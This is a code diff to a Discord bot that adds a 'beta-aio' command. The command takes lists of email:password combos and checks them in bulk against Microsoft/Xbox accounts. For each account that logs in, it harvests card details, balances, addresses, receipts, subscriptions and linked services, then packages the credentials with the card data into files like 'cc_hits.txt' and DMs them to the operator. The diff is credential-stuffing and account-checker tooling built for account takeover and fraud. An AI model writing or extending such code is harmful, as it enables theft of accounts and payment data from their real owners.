@@ -54,6 +54,8 @@ const {
   betaFarmResultsEmbed,
   betaBridgeProgressEmbed,
   betaBridgeResultsEmbed,
+  betaAioProgressEmbed,
+  betaAioResultsEmbed,
   errorEmbed,
   successEmbed,
   infoEmbed,
@@ -73,7 +75,7 @@ const { checkRewardsBalances } = require("./utils/microsoft-rewards");
 const { checkNetflixAccounts } = require("./utils/netflix-checker");
 const { checkSteamAccounts, shortenGames } = require("./utils/steam-checker");
 const { checkXboxAccounts } = require("./utils/xbox-full-checker");
-const { snipeRegionalPrices, ghostRedeemCodes, mineReceipts, scanPaymentArsenal, scanEntitlements, farmRewards, scanLinkedServices } = require("./utils/beta-functions");
+const { snipeRegionalPrices, ghostRedeemCodes, mineReceipts, scanPaymentArsenal, scanEntitlements, farmRewards, scanLinkedServices, aioScan } = require("./utils/beta-functions");
 
 const client = new Client({
   intents: [
@@ -1575,6 +1577,179 @@ async function handleBetaBridge(respond, userId, accountsRaw, accountsFile, thre
   } finally { activeAborts.delete(userId); limiter.release(userId); }
 }
 
+async function handleBetaAio(respond, userId, accountsRaw, accountsFile, threads = 10, dmUser = null) {
+  if (!isOwner(userId)) return respond({ embeds: [errorEmbed("Beta functions are owner-locked.")] });
+  const acquire = limiter.acquire(userId, "beta-aio");
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users reached.`)] });
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (!accounts.length) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
+
+    const live = { hits: 0, empty: 0, fails: 0, receipts: 0, cards: 0, entitlements: 0, linked: 0 };
+    const msg = await respond({ embeds: [betaAioProgressEmbed(0, accounts.length, live)], components: [stopButton(userId)], fetchReply: true });
+    const t0 = Date.now();
+    let lastEdit = 0;
+
+    const results = await aioScan(accounts, Math.min(threads, 30), (done, total, r) => {
+      if (r?.status === "hit") {
+        live.hits++;
+        live.receipts += r.receipt?.receipts?.length || 0;
+        live.cards += r.payment?.paymentMethods?.length || 0;
+        live.entitlements += r.entitle?.entitlements?.length || 0;
+        live.linked += r.bridge?.linkedCount || 0;
+      } else if (r?.status === "empty") live.empty++;
+      else live.fails++;
+
+      const now = Date.now();
+      if (now - lastEdit < 1500) return;
+      lastEdit = now;
+      updateProgress(msg, betaAioProgressEmbed(done, total, live), userId).catch(() => {});
+    }, ac.signal);
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1) + "s";
+    const hits = results.filter(r => r.status === "hit");
+    const files = [];
+
+    let totalReceipts = 0, totalSpent = 0, totalCards = 0, totalSubs = 0;
+    let totalEntitlements = 0, totalValue = 0, totalLinks = 0, totalPoints = 0;
+
+    // ── Build per-account summary (main file) ──
+    if (hits.length > 0) {
+      const summaryLines = hits.map(h => {
+        totalReceipts += h.receipt?.receipts?.length || 0;
+        totalSpent += parseFloat(h.receipt?.totalSpent || 0);
+        totalCards += h.payment?.paymentMethods?.length || 0;
+        totalSubs += h.payment?.subscriptions?.length || 0;
+        totalEntitlements += h.entitle?.entitlements?.length || 0;
+        totalValue += parseFloat(h.entitle?.totalValue || 0);
+        totalLinks += h.bridge?.linkedCount || 0;
+        totalPoints += parseInt(h.payment?.points || 0, 10);
+
+        let block = `${"═".repeat(50)}\n`;
+        block += `Email: ${h.user}\nPassword: ${h.password}\n`;
+        block += `${"─".repeat(50)}\n`;
+
+        // Payment
+        if (h.payment) {
+          block += `[PAYMENT]\n`;
+          block += `  Balance: $${h.payment.balance} | CC: ${h.payment.ccInfo}\n`;
+          block += `  Address: ${h.payment.address}\n`;
+          block += `  Points: ${h.payment.points}\n`;
+          if (h.payment.paymentMethods?.length) {
+            for (const pm of h.payment.paymentMethods) block += `  Method: ${pm.type} | ${pm.name} | ${pm.status}\n`;
+          }
+          if (h.payment.subscriptions?.length) {
+            for (const s of h.payment.subscriptions) block += `  Sub: ${s.title} | Renew: ${s.autoRenew} | Next: ${s.nextBilling}\n`;
+          }
+        }
+
+        // Receipts
+        if (h.receipt?.receipts?.length) {
+          block += `[RECEIPTS] (${h.receipt.receipts.length}) — $${h.receipt.totalSpent}\n`;
+          for (const r of h.receipt.receipts.slice(0, 20)) {
+            block += `  ${r.date} | ${r.title} | ${r.amount} ${r.currency}\n`;
+          }
+          if (h.receipt.receipts.length > 20) block += `  ... +${h.receipt.receipts.length - 20} more\n`;
+          if (h.receipt.cards?.length) {
+            for (const c of h.receipt.cards) block += `  Card: ${c.type} | ${c.name}\n`;
+          }
+        }
+
+        // Entitlements
+        if (h.entitle?.entitlements?.length) {
+          block += `[ENTITLEMENTS] (${h.entitle.entitlements.length}) — $${h.entitle.totalValue}\n`;
+          for (const e of h.entitle.entitlements.slice(0, 15)) {
+            block += `  ${e.date} | ${e.title} | ${e.amount} ${e.currency}\n`;
+          }
+          if (h.entitle.entitlements.length > 15) block += `  ... +${h.entitle.entitlements.length - 15} more\n`;
+        }
+
+        // Linked Services
+        if (h.bridge?.linkedCount > 0) {
+          block += `[LINKED SERVICES] (${h.bridge.linkedCount})\n`;
+          for (const [name, info] of Object.entries(h.bridge.services || {})) {
+            if (!info?.linked) continue;
+            block += `  ${name}: `;
+            if (name === "Xbox") block += `GT: ${info.gamertag} | GS: ${info.gamerscore} | Tier: ${info.tier}`;
+            else if (name === "GamePass") block += `${info.offerCount} offers`;
+            else if (name === "Minecraft") block += info.title || "Yes";
+            else if (name === "EAPlay") block += "Yes";
+            else if (name === "Rewards") block += `${info.points} pts`;
+            else if (name === "Library") block += `${info.totalGames} games`;
+            block += "\n";
+          }
+        }
+
+        return block;
+      }).join("\n");
+      files.push(textAttachment(summaryLines.split("\n"), "aio_full_report.txt"));
+
+      // ── Separate hit files for quick access ──
+      const ccHits = hits.filter(h => h.payment?.ccInfo && h.payment.ccInfo !== "N/A" && h.payment.ccInfo !== "N/A | N/A");
+      if (ccHits.length) {
+        const lines = ccHits.map(h => `${h.user}:${h.password} | ${h.payment.ccInfo} | Balance: $${h.payment.balance}`);
+        files.push(textAttachment(lines, "cc_hits.txt"));
+      }
+
+      const subHits = hits.filter(h => h.payment?.subscriptions?.length > 0);
+      if (subHits.length) {
+        const lines = subHits.map(h => {
+          const subs = h.payment.subscriptions.map(s => s.title).join(", ");
+          return `${h.user}:${h.password} | ${subs}`;
+        });
+        files.push(textAttachment(lines, "subscription_hits.txt"));
+      }
+
+      const xboxHits = hits.filter(h => h.bridge?.services?.Xbox?.linked);
+      if (xboxHits.length) {
+        const lines = xboxHits.map(h => {
+          const x = h.bridge.services.Xbox;
+          return `${h.user}:${h.password} | GT: ${x.gamertag} | GS: ${x.gamerscore} | Tier: ${x.tier}`;
+        });
+        files.push(textAttachment(lines, "xbox_hits.txt"));
+      }
+
+      const balanceHits = hits.filter(h => parseFloat(h.payment?.balance || 0) > 0);
+      if (balanceHits.length) {
+        const lines = balanceHits.map(h => `${h.user}:${h.password} | Balance: $${h.payment.balance}`);
+        files.push(textAttachment(lines, "balance_hits.txt"));
+      }
+    }
+
+    // ZIP all files if more than 1
+    let finalFiles = files;
+    if (files.length > 1) {
+      try {
+        const { buildZipBuffer } = require("./utils/zip-builder");
+        const entries = files.map(f => ({ name: f.name, content: Buffer.from(f.attachment) }));
+        const zipBuf = buildZipBuffer(entries);
+        finalFiles = [new AttachmentBuilder(zipBuf, { name: "aio_results.zip" })];
+      } catch { finalFiles = files; }
+    }
+
+    const stats = {
+      total: accounts.length, hits: hits.length, empty: results.filter(r => r.status === "empty").length,
+      fails: results.filter(r => r.status === "fail").length,
+      totalReceipts, totalSpent: totalSpent.toFixed(2), totalCards, totalSubs,
+      totalEntitlements, totalValue: totalValue.toFixed(2), totalLinks, totalPoints, elapsed,
+    };
+    const embed = betaAioResultsEmbed(stats);
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files: finalFiles });
+        await msg.edit({ embeds: [successEmbed(`AIO scan done. ${hits.length} hits. Sent to DMs.`)], components: [] });
+      } catch { await msg.edit({ embeds: [embed], files: finalFiles, components: [] }); }
+    } else { await msg.edit({ embeds: [embed], files: finalFiles, components: [] }); }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`AIO scanner error: ${err.message}`)] });
+  } finally { activeAborts.delete(userId); limiter.release(userId); }
+}
+
 // ── Slash Commands ───────────────────────────────────────────
 
 client.on("interactionCreate", async (interaction) => {
@@ -1735,6 +1910,9 @@ client.on("interactionCreate", async (interaction) => {
     } else if (commandName === "beta-bridge") {
       await interaction.deferReply();
       await handleBetaBridge(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
+    } else if (commandName === "beta-aio") {
+      await interaction.deferReply();
+      await handleBetaAio(respond, user.id, interaction.options.getString("accounts"), interaction.options.getAttachment("accounts_file"), interaction.options.getInteger("threads") || 10, user);
     }
   } catch (err) {
     console.error(`Slash command error [${commandName}]:`, err);
@@ -1971,6 +2149,11 @@ client.on("messageCreate", async (message) => {
       const attachment = message.attachments.first();
       if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-bridge <accounts>` or attach .txt")] });
       await handleBetaBridge(respond, message.author.id, accountsRaw, attachment, 10, message.author);
+    } else if (cmd === "beta-aio" || cmd === "betaaio" || cmd === "aio") {
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!accountsRaw && !attachment) return respond({ embeds: [infoEmbed("Usage", "`.beta-aio <accounts>` or attach .txt")] });
+      await handleBetaAio(respond, message.author.id, accountsRaw, attachment, 10, message.author);
     }
   } catch (err) {
     console.error(`Prefix command error [${cmd}]:`, err);
